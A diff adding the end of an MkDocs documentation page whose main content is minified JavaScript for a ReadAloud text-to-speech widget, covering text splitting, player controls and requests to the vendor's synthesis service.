+        function t(e, t) {
+            for (var n = [], o = 0; o &lt; e.length; o += 2) {
+                var r = o + 1 &lt; e.length ? e[o] + e[o + 1] : e[o];
+                r &amp;&amp; (t &amp;&amp; n.length &amp;&amp; t.test(n[n.length - 1]) ? n[n.length - 1] += r : n.push(r))
+            }
+            return n
+        }
+        this.getParagraphs = function(e) {
+            return t(e.split(/((?:\r?\n\s*){2,})/))
+        }
+        ,
+        this.getSentences = function(e) {
+            return t(e.split(/([.!?]+[\s\u200b]+)/), /\b(\w|[A-Z][a-z]|Assn|Ave|Capt|Col|Comdr|Corp|Cpl|Gen|Gov|Hon|Inc|Lieut|Ltd|Rev|Univ|Jan|Feb|Mar|Apr|Aug|Sept|Oct|Nov|Dec|dept|ed|est|vol|vs)\.\s+$/)
+        }
+        ,
+        this.getPhrases = function(e) {
+            return t(e.split(/([,;:]\s+|\s-+\s+|—\s*)/))
+        }
+        ,
+        this.getWords = function(e) {
+            for (var t = e.trim().split(/([~@#%^*_+=&lt;&gt;]|[\s\-—/]+|\.(?=\w{2,})|,(?=[0-9]))/), n = [], o = 0; o &lt; t.length; o += 2)
+                t[o] &amp;&amp; n.push(t[o]),
+                o + 1 &lt; t.length &amp;&amp; (/^[~@#%^*_+=&lt;&gt;]$/.test(t[o + 1]) ? n.push(t[o + 1]) : n.length &amp;&amp; (n[n.length - 1] += t[o + 1]));
+            return n
+        }
+    }
+    function p() {
+        function t(e) {
+            for (var t = [], n = 0; n &lt; e.length; n += 2)
+                n + 1 &lt; e.length ? t.push(e[n] + e[n + 1]) : e[n] &amp;&amp; t.push(e[n]);
+            return t
+        }
+        this.getParagraphs = function(e) {
+            return t(e.split(/((?:\r?\n\s*){2,})/))
+        }
+        ,
+        this.getSentences = function(e) {
+            return t(e.split(/([.!?]+[\s\u200b]+|[\u3002\uff01]+)/))
+        }
+        ,
+        this.getPhrases = function(e) {
+            return t(e.split(/([,;:]\s+|[\u2025\u2026\u3000\u3001\uff0c\uff1b]+)/))
+        }
+        ,
+        this.getWords = function(e) {
+            return e.replace(/\s+/g, &quot;&quot;).split(&quot;&quot;)
+        }
+    }
+    function v(o, r) {
+        var i;
+        this.speak = function(e, t, n) {
+            return clearTimeout(i),
+            i = setTimeout(function() {
+                o.stop(),
+                onEvent({
+                    type: &quot;end&quot;,
+                    charIndex: e.length
+                })
+            }, r),
+            o.speak(e, t, function() {
+                clearTimeout(i),
+                n()
+            })
+        }
+        ,
+        this.stop = function() {
+            clearTimeout(i),
+            o.stop()
+        }
+    }
+    this.addEventListener = function(e, t) {
+        d[e] ? d[e].push(t) : d[e] = [t]
+    }
+    ,
+    this.removeEventListener = function(e, t) {
+        d[e] &amp;&amp; (d[e] = d[e].filter(function(e) {
+            return e != t
+        }))
+    }
+    ,
+    this.dispatchEvent = function(t) {
+        d[t.type] &amp;&amp; d[t.type].forEach(function(e) {
+            e(t)
+        })
+    }
+}
+function ReadAloudPlayer(o, t, a, e) {
+    var r = {};
+    !o.isTTS &amp;&amp; /iPad|iPhone|iPod/.test(navigator.userAgent) &amp;&amp; a(&quot;.ra-no-ios&quot;).hide();
+    a(&quot;.ra-logo&quot;, t).css(&quot;cursor&quot;, &quot;pointer&quot;).click(function() {
+        window.open(&quot;https://www.readaloudwidget.com/&quot;, &quot;_blank&quot;)
+    });
+    var n = a(&quot;.ra-btn-play&quot;, t)
+      , i = a(&quot;.ra-btn-rewind&quot;, t)
+      , s = (n.click(function() {
+        a(t).is(&quot;.ra-playing&quot;) ? o.pause() : o.play()
+    }),
+    i.click(function() {
+        o.currentTime = Math.max(o.currentTime - (o.isTTS ? 1 : 5), 0)
+    }),
+    a(&quot;.ra-btn[data-toggle]&quot;).click(function() {
+        var e = a(this).data(&quot;toggle&quot;);
+        return a(&quot;.ra-overlay&quot;, t).not(e).hide(),
+        a(e).toggle(),
+        !1
+    }),
+    a(document).on(&quot;mouseup touchend touchcancel&quot;, function(e) {
+        a(e.target).closest(&quot;.ra-btn[data-toggle], .ra-overlay&quot;).length || a(&quot;.ra-overlay&quot;, t).hide()
+    }),
+    a(&quot;.ra-time-text&quot;, t))
+      , u = a(&quot;.ra-error-text&quot;, t)
+      , c = a(&quot;.ra-status-bg&quot;, t)
+      , l = a(&quot;.ra-load-progress-bar&quot;, t)
+      , d = a(&quot;.ra-playback-position-bar&quot;, t)
+      , h = a(&quot;.ra-seek-knob&quot;, t)
+      , f = (c.click(function(e) {
+        o.currentTime = P(c, e) * o.duration
+    }),
+    h.click(function() {
+        return !1
+    }),
+    h.on(&quot;mousedown touchstart&quot;, function() {
+        return r.seekKnob = !0,
+        T(function(e) {
+            var e = P(c, e)
+              , t = 100 * e + &quot;%&quot;;
+            h.css(&quot;left&quot;, t),
+            d.css(&quot;width&quot;, t),
+            o.duration &amp;&amp; o.duration != 1 / 0 &amp;&amp; S(e * o.duration)
+        }, function(e) {
+            r.seekKnob = !1,
+            o.currentTime = P(c, e) * o.duration
+        }),
+        !1
+    }),
+    a(&quot;.ra-voice-select&quot;, t));
+    o.isTTS ? (o.voices.forEach(function(e) {
+        a(&quot;&lt;option&gt;&quot;).text(e.name).val(e.name).appendTo(f)
+    }),
+    f.val(o.voice.name),
+    f.change(function() {
+        var e = o.voices.find(function(e) {
+            return e.name == f.val()
+        });
+        e = e,
+        o.voice = e,
+        localStorage.setItem(&quot;sitespeakerVoice&quot;, e.name)
+    })) : f.parent().hide();
+    var p = a(&quot;.ra-rate-bg&quot;, t)
+      , v = a(&quot;.ra-rate-bar&quot;, t)
+      , g = a(&quot;.ra-rate-knob&quot;, t);
+    function m(e) {
+        o.playbackRate = e,
+        localStorage.setItem(&quot;sitespeakerRate&quot;, e)
+    }
+    p.click(function(e) {
+        m(Math.exp((2 * P(p, e) - 1) * Math.log(2)))
+    }),
+    g.click(function() {
+        return !1
+    }),
+    g.on(&quot;mousedown touchstart&quot;, function() {
+        r.rateKnob = !0;
+        var n = A(o.isTTS ? 500 : 100, m);
+        return T(function(e) {
+            var e = P(p, e)
+              , t = 100 * e + &quot;%&quot;;
+            g.css(&quot;left&quot;, t),
+            v.css(&quot;width&quot;, t),
+            n(Math.exp((2 * e - 1) * Math.log(2)))
+        }, function() {
+            r.rateKnob = !1
+        }),
+        !1
+    });
+    var y, w = a(&quot;.ra-volume-bg&quot;, t), b = a(&quot;.ra-volume-bar&quot;, t), E = a(&quot;.ra-volume-knob&quot;, t);
+    function k(e) {
+        o.volume = e,
+        localStorage.setItem(&quot;sitespeakerVolume&quot;, e)
+    }
+    w.click(function(e) {
+        k(P(w, e))
+    }),
+    E.click(function() {
+        return !1
+    }),
+    E.on(&quot;mousedown touchstart&quot;, function() {
+        r.volumeKnob = !0;
+        var n = A(o.isTTS ? 500 : 100, k);
+        return T(function(e) {
+            var e = P(w, e)
+              , t = 100 * e + &quot;%&quot;;
+            E.css(&quot;left&quot;, t),
+            b.css(&quot;width&quot;, t),
+            n(e)
+        }, function() {
+            r.volumeKnob = !1
+        }),
+        !1
+    }),
+    a(o).on(&quot;play&quot;, function() {
+        a(t).addClass(&quot;ra-playing&quot;)
+    }),
+    a(o).on(&quot;progress&quot;, function(e) {
+        l.css(&quot;width&quot;, 100 * e.loaded / e.total + &quot;%&quot;)
+    }),
+    a(o).on(&quot;playing&quot;, function() {
+        a(t).removeClass(&quot;ra-stalled ra-error&quot;)
+    }),
+    a(o).on(&quot;pause ended&quot;, function() {
+        a(t).removeClass(&quot;ra-playing&quot;)
+    }),
+    a(o).on(&quot;error&quot;, function() {
+        a(t).addClass(&quot;ra-error&quot;),
+        u.text(o.error.message)
+    }),
+    a(o).on(&quot;stalled&quot;, function() {
+        a(t).addClass(&quot;ra-stalled&quot;)
+    }),
+    a(o).on(&quot;timeupdate&quot;, function() {
+        var e;
+        r.seekKnob || (e = 100 * o.currentTime / o.duration + &quot;%&quot;,
+        h.css(&quot;left&quot;, e),
+        d.css(&quot;width&quot;, e),
+        o.duration &amp;&amp; o.duration != 1 / 0 &amp;&amp; S(o.currentTime))
+    }),
+    a(o).on(&quot;voicechange&quot;, function() {
+        f.val(o.voice.name)
+    }),
+    a(o).on(&quot;ratechange&quot;, function() {
+        var e;
+        r.rateKnob || (e = 50 + 50 * Math.log(o.playbackRate) / Math.log(2) + &quot;%&quot;,
+        p.is(&quot;.ra-vertical&quot;) ? (g.css(&quot;bottom&quot;, e),
+        v.css(&quot;height&quot;, e)) : (g.css(&quot;left&quot;, e),
+        v.css(&quot;width&quot;, e)))
+    }),
+    a(o).on(&quot;volumechange&quot;, function() {
+        var e;
+        r.volumeKnob || (e = 100 * o.volume + &quot;%&quot;,
+        w.is(&quot;.ra-vertical&quot;) ? (E.css(&quot;bottom&quot;, e),
+        b.css(&quot;height&quot;, e)) : (E.css(&quot;left&quot;, e),
+        b.css(&quot;width&quot;, e)))
+    }),
+    o.isTTS &amp;&amp; (y = localStorage.getItem(&quot;sitespeakerVoice&quot;)) &amp;&amp; (n = o.voices.find(function(e) {
+        return e.name == y
+    })) &amp;&amp; (o.voice = n);
+    i = localStorage.getItem(&quot;sitespeakerRate&quot;) || e.defaultRate,
+    i &amp;&amp; (o.defaultPlaybackRate = o.playbackRate = Number(i)),
+    a(o).triggerHandler(&quot;ratechange&quot;),
+    n = localStorage.getItem(&quot;sitespeakerVolume&quot;) || e.defaultVolume;
+    function T(t, n) {
+        function o(e) {
+            return e.clientX = e.originalEvent.changedTouches[0].clientX,
+            e.clientY = e.originalEvent.changedTouches[0].clientY,
+            t(e),
+            !1
+        }
+        function r(e) {
+            return e.clientX = e.originalEvent.changedTouches[0].clientX,
+            e.clientY = e.originalEvent.changedTouches[0].clientY,
+            i(e),
+            !1
+        }
+        function i(e) {
+            return a(document).off(&quot;mousemove&quot;, t),
+            a(document).off(&quot;mouseup mouseleave&quot;, i),
+            a(document).off(&quot;touchmove&quot;, o),
+            a(document).off(&quot;touchend touchcancel&quot;, r),
+            n &amp;&amp; n(e),
+            !1
+        }
+        a(document).on(&quot;mousemove&quot;, t),
+        a(document).on(&quot;mouseup mouseleave&quot;, i),
+        a(document).on(&quot;touchmove&quot;, o),
+        a(document).on(&quot;touchend touchcancel&quot;, r)
+    }
+    function P(e, t) {
+        var n = e.get(0).getBoundingClientRect()
+          , e = e.is(&quot;.ra-vertical&quot;) ? 1 - (t.clientY - n.top) / n.height : (t.clientX - n.left) / n.width;
+        return Math.min(1, Math.max(e, 0))
+    }
+    function S(e) {
+        var t;
+        o.isTTS ? s.text(Math.min(Math.round(e) + 1, o.duration) + &quot;/&quot; + o.duration) : s.text(&quot;-&quot; + (e = o.duration - e,
+        t = Math.floor(e / 60),
+        e = Math.floor(e - 60 * t),
+        (t &lt; 10 ? &quot;0&quot; : &quot;&quot;) + t + &quot;:&quot; + (e &lt; 10 ? &quot;0&quot; : &quot;&quot;) + e))
+    }
+    function A(e, t) {
+        var n, o;
+        return function() {
+            o = {
+                this: this,
+                args: arguments
+            },
+            n = n || setTimeout(r, e)
+        }
+        ;
+        function r() {
+            n = null,
+            t.apply(o.this, o.args)
+        }
+    }
+    n &amp;&amp; (o.volume = Number(n)),
+    a(o).triggerHandler(&quot;volumechange&quot;)
+}
+function ReadAloudDoc(i) {
+    var a = [&quot;H1&quot;, &quot;H2&quot;, &quot;H3&quot;, &quot;H4&quot;, &quot;H5&quot;, &quot;H6&quot;]
+      , s = [&quot;P&quot;, &quot;BLOCKQUOTE&quot;, &quot;PRE&quot;]
+      , r = [&quot;OL&quot;, &quot;UL&quot;];
+    function u(e) {
+        i(e).find(&quot;sup&quot;).hide(),
+        i(e).find(&quot;*&quot;).filter(function() {
+            return this.style &amp;&amp; &quot;absolute&quot; == this.style.position
+        }).hide();
+        var t = e.innerText.trim();
+        return &quot;LI&quot; == e.tagName ? i(e).index() + 1 + &quot;. &quot; + t : t
+    }
+    function c(e) {
+        e = e ? a.indexOf(e.tagName) : -1;
+        return -1 == e ? 100 : e + 1
+    }
+    function l(e, t) {
+        return e == document.body ? null : 1 == e.nodeType &amp;&amp; !t &amp;&amp; e.lastChild ? e.lastChild : e.previousSibling || l(e.parentNode, !0)
+    }
+    function d(e) {
+        return e
+    }
+    this.getTexts = function() {
+        0 &lt; i(&quot;.read-aloud&quot;).length || (0 &lt; i(&quot;.sitespeaker-read-aloud&quot;).length ? i(&quot;.sitespeaker-read-aloud&quot;).addClass(&quot;read-aloud&quot;) : (e = function(e) {
+            for (var t = e.slice(0, 1), n = 1; n &lt; e.length; n++)
+                e[n] != e[n - 1] &amp;&amp; t.push(e[n]);
+            return t
+        }(e = i(&quot;p&quot;).not(&quot;blockquote &gt; p&quot;).parent().get()),
+        (e = i(e).filter(&quot;:visible&quot;).get()).length ? (n = e.map(function(e) {
+            return i(e).children(s.join(&quot;, &quot;)).text().length
+        }),
+        o = Math.max.apply(null, n),
+        (e = e.filter(function(e, t) {
+            return n[t] &gt; o / 7
+        })).forEach(function(e) {
+            i(function(e) {
+                var t = []
+                  , e = i(e).children(a.concat(s).join(&quot;, &quot;)).get(0)
+                  , n = c(e)
+                  , o = l(e, !0);
+                for (; o &amp;&amp; !i(o).hasClass(&quot;read-aloud&quot;); ) {
+                    var r;
+                    1 != o.nodeType || (r = c(o)) &lt; n &amp;&amp; (t.push(o),
+                    n = r),
+                    o = l(o)
+                }
+                return t.reverse()
+            }(e)).addClass(&quot;read-aloud&quot;),
+            i(e).children(a.concat(s).join(&quot;, &quot;)).addClass(&quot;read-aloud&quot;),
+            i(e).children(r.join(&quot;, &quot;)).children(&quot;li&quot;).addClass(&quot;read-aloud&quot;)
+        })) : i(a.concat(s).join(&quot;, &quot;)).filter(&quot;:visible&quot;).addClass(&quot;read-aloud&quot;)));
+        var n, o, e = i(&quot;.no-read-aloud:visible&quot;).hide(), t = function(e) {
+            for (var t = i(e).get().map(u).filter(d), n = 0; n &lt; t.length; n++)
+                /\w$/.test(t[n]) &amp;&amp; (t[n] += &quot;.&quot;);
+            return console.log(t),
+            t
+        }(&quot;.read-aloud:visible&quot;);
+        return e.show(),
+        t
+    }
+}
+
+function readAloudInit(o, r,t,  texto) {
+    var i = o.getAttribute(&quot;data-lang&quot;)
+      , a = o.getAttribute(&quot;data-voice&quot;)
+      , s = o.getAttribute(&quot;data-key&quot;)
+      , u = o.getAttribute(&quot;data-speed&quot;) || o.getAttribute(&quot;data-rate&quot;)
+      , c = o.getAttribute(&quot;data-volume&quot;)
+      , l = &quot;free&quot; == a || s.startsWith(&quot;39d740e&quot;) ? new ReadAloudWebSpeech : null;
+    return r &amp;&amp; t ? d().then(function() {
+        var e = r.getElementsByClassName(&quot;ra-btn-play&quot;)[0]
+          , t = function() {
+            e.removeEventListener(&quot;click&quot;, t),
+            /iPad|iPhone|iPod/.test(navigator.userAgent) &amp;&amp; (o.src = &quot;https://assets.readaloudwidget.com/embed/sound/silence.mp3&quot;,
+            o.play(),
+            l &amp;&amp; &quot;undefined&quot; != typeof speechSynthesis &amp;&amp; speechSynthesis.speak(new SpeechSynthesisUtterance(&quot; &quot;))),
+            n()
+        };
+        e.addEventListener(&quot;click&quot;, t)
+    }) : n();
+    function n() {
+        var n;
+        return Promise.all([l &amp;&amp; l.ready(i), !window.jQuery &amp;&amp; h(&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;).then(eval)]).then(function(e) {
+            n = e[0];
+            if (texto!=&quot;&quot;){
+                var e = texto;
+                checkRead = true;
+            } else {
+                checkRead = false;
+                var e = &quot;function&quot; == typeof readAloudGetText ? readAloudGetText(jQuery) : new ReadAloudDoc(jQuery).getTexts().join(&quot;\n\n&quot;);
+            }
+            return Promise.all([n ? e : (e = e,
+            function(o, r) {
+                return new Promise(function(e, t) {
+                    var n = new XMLHttpRequest;
+                    n.open(&quot;POST&quot;, o, !0),
+                    n.setRequestHeader(&quot;Content-type&quot;, &quot;application/json&quot;),
+                    n.onreadystatechange = function() {
+                        4 == n.readyState &amp;&amp; (200 == n.status ? e(n.responseText) : t(new Error(n.responseText || n.statusText || n.status)))
+                    }
+                    ,
+                    n.send(JSON.stringify(r))
+                }
+                )
+            }(&quot;https://ws.readaloudwidget.com/synthesize?t=&quot; + Date.now(), {
+                text: e,
+                lang: i,
+                voice: a,
+                key: s,
+                referer: location.href
+            }).then(JSON.parse).then(function(e) {
+                return e.url
+            })), r &amp;&amp; (t ? Promise.resolve() : d()).then(function() {
+                new ReadAloudPlayer(n ? l : o,r,jQuery,{
+                    defaultRate: u,
+                    defaultVolume: c
+                }),
+                jQuery(r).addClass(&quot;ra-loading&quot;)
+            })])
+        }).then(function(e) {
+            function t() {
+                jQuery(r).removeClass(&quot;ra-loading&quot;)
+            }
+            n ? (jQuery(l).one(&quot;canplay&quot;, t),
+            l.setText(e[0]),
+            l.play()) : (jQuery(o).one(&quot;canplay&quot;, t),
+            o.src = e[0],
+            o.play())
+        })
+    }
+    function d() {
+        var e, t = r.getAttribute(&quot;data-skin&quot;);
+        return Promise.all([h(t + &quot;/template.html&quot;), (t = t + &quot;/styles.css&quot;,
+        e = document.createElement(&quot;LINK&quot;),
+        document.head.appendChild(e),
+        e.setAttribute(&quot;type&quot;, &quot;text/css&quot;),
+        e.setAttribute(&quot;rel&quot;, &quot;stylesheet&quot;),
+        void e.setAttribute(&quot;href&quot;, t))]).then(function(e) {
+            r.innerHTML = e[0]
+        })
+    }
+    function h(o) {
+        return new Promise(function(e, t) {
+            var n = new XMLHttpRequest;
+            n.open(&quot;GET&quot;, o, !0),
+            n.onreadystatechange = function() {
+                4 == n.readyState &amp;&amp; (200 == n.status ? e(n.responseText) : t(new Error(n.responseText || n.statusText || n.status)))
+            }
+            ,
+            n.send(null)
+        }
+        )
+    }
+}
+</code></pre>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+    
+  </body>
+</html>
